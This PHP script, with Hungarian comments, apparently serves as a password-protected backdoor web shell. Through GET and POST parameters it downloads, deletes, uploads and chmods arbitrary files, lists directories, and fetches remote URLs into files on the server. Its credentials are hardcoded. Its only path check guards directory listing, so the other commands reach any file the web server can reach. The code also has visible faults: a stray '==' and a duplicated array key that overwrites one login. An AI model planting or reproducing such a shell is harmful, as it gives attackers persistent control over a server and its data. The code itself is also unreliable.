<?php
@session_start();

#v1.0.1 CHMOD és wget funkciók hozzáadva.
$login = array (
    "user"  => array("Jani" => "sdf9azfs789azr+55"),
	"user"	=> array("Marcell" => "sancika"), 
);==

$parent_mappa = "./";
if(isset($_POST['loginSubmit'])) {
if($_POST['nev'] == "Jani" && $_POST['jelszo'] == $login['user']['Jani']) {
  $_SESSION['korlatozott_FTP']['id'] = "Michael_Wildmore";
}
if($_POST['nev'] == "Marcell" && $_POST['jelszo'] == $login['user']['Marcell']) {
  $_SESSION['korlatozott_FTP']['id'] = "Marcell_O_Neill";
}
}
if(isset($_POST['logout'])) {
session_destroy();
}
if(!isset($_SESSION['korlatozott_FTP']['id'])) {
echo '<center>
<form method="post"><input type="text" name="nev" /><br/>
<input type="password" name="jelszo" /> <br/>
<input type="submit" name="loginSubmit" />
</form></center>';
} else {
$redirect = "http://ip.classrpg.net";
        if(isset($_GET['cmd'])) {
                if($_GET['cmd'] == "open") {
                        if(isset($_GET['args'])) {
                if(file_exists($_GET['args'])) {
	header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($_GET['args']));
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($_GET['args']));
	readfile($_GET['args']);
                    exit;
                } else {
                                        die("404!");
                }
                        } else {
                header( 'Location: '.$redirect );
                        }
                } else if($_GET['cmd'] == "rm") {
                        if(isset($_GET['args'])) {
                if(file_exists($_GET['args'])) {
                    $suc = unlink($_GET['args']);
                                        if($suc) {
                                                echo($_GET['args']. ' <- Volt, nincs!');
                                        } else {
                                                echo($_GET['args']. ' <- Volt, van, lesz!');
                                        }
                    exit;
                } else {
                                        die($_GET['args']. ' <- Nincs, nem volt, és nem is lesz!');
                }
                        } else {
                header( 'Location: '.$redirect );
                        }
                } else if($_GET['cmd'] == "rmdir") {
                        if(isset($_GET['args'])) {
                if(file_exists($_GET['args'])) {
                    $suc = rmdir($_GET['args']);
                                        if($suc) {
                                                echo($_GET['args']. ' <- Volt, nincs!');
                                        } else {
                                                echo($_GET['args']. ' <- Volt, van, lesz!');
                                        }
                    exit;
                } else {
                                        die($_GET['args']. ' <- Nincs, nem volt, és nem is lesz!');
                }
                        } else {
                header( 'Location: '.$redirect );
                        }
                } else if($_GET['cmd'] == "mkdir") {
                        if(isset($_GET['args'])) {
                                $suc = mkdir($_GET['args'], '0777', true);
                                if($suc) {
                                        echo($_GET['args']. ' <- Oks');
                                } else {
                                        echo($_GET['args']. ' <- Nemoks, újratry 0700 moddal');
                                        $suc2 = mkdir($_GET['args'], '0700', true);
                                        if($suc2) {
                                                echo("   ééééééés, jó!");
                                        } else {
                                                echo("   ééééééés, nem!");
                                        }
                                }
                                exit;
                        } else {
                header( 'Location: '.$redirect );
                        }
                } else if($_GET['cmd'] == "ls") {
                        if(isset($_GET['args'])) {
                                $dir    = $_GET['args'];
								if($dir == "this") { $dir= $parent_mappa; }
								if (substr( $dir, 0, 3 ) === "../" || substr( $dir, 0, 5 ) === "./../") { echo '<b>nana.</b>';die(); }
								if(!is_dir($dir)) { echo '<a href="'.$_SERVER['HTTP_REFERER'].'"><- Vissza</a><br/>'; die("Nem fajl!"); }
								$files1 = scandir("./".$dir);
								$i = 0;
								foreach($files1 as $entry) {
								$asd = (is_dir($entry)) ? "[".$i."] <a href='?cmd=ls&args=".$dir.$entry."/'>".$entry."</a><br/>" : "[".$i."] <a href='?cmd=open&args=".$dir.$entry."'>".$entry."</a><br/>";
								
								print_r($asd);
								$i++;
								}
                                //print_r($files1);
                                exit;
                        } else {
						echo '<a href="?cmd=ls&args=this">Parent mappaban levo fajlok listazasa!</a>';
                                exit;
                        }
                } else if($_GET['cmd'] == "wget") {
                        if(isset($_GET['args']) AND isset($_GET['name']) AND isset($_GET['modifier'])) {
                                $fp = fopen($_GET['name'], 'w');
                                fwrite($fp, file_get_contents($_GET['args']));
                                fclose($fp);
                                echo('Error nem található!');
                                exit;
                        } else {
                header( 'Location: '.$redirect );
                        }
                } else if($_GET['cmd'] == "upload") {
                       echo('<form action="'.$_SERVER["PHP_SELF"].'" method="post" enctype="multipart/form-data"> <label for="file">Sün:</label> <input type="file" name="file" id="file"><br> <input type="submit" name="submit" value="Toljad"> <br><input type="text" name="place" placeholder="dir"><br><input type="text" name="name" placeholder="nev"></form>');
                } else if($_GET['cmd'] == "info") {
                       
                } else if($_GET['cmd'] == "chmod") {
                        if(isset($_GET['args']) AND isset($_GET['mod'])) {
                                $suc = chmod($_GET['args'], $_GET['mod']);
                                if($suc) {
                                        echo($_GET['args']. ' <- Oks');
                                } else {
                                        echo($_GET['args']. ' <- Nemoks');
                                }
                                exit;
                        } else {
                header( 'Location: '.$redirect );
                        }
                } else {
                header( 'Location: '.$redirect );
                }
               
        } else if($_POST['submit']) {
                move_uploaded_file($_FILES["file"]["tmp_name"],
      $_POST['place'] . $_POST['name']);
      echo "Ide tolva: " . $_POST['place'] . $_POST['name'];
        } else {
                header( 'Location: '.$redirect );
        }
 }
?>